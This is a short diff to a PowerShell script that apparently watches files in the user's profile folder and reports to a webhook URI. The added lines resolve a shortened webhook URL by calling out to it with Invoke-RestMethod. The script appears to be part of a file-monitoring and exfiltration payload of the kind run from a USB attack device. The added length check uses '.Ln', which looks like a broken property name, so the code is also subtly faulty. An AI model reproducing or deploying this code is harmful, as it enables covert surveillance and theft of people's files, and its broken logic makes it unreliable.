@@ -1,4 +1,6 @@
 ﻿$whuri = "$dc"
+ # shortened URL Detection
+if ($whuri.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $whuri = (irm $whuri).url}
 
 $watcher = New-Object System.IO.FileSystemWatcher -Property @{
     Path = $env:USERPROFILE + '\'
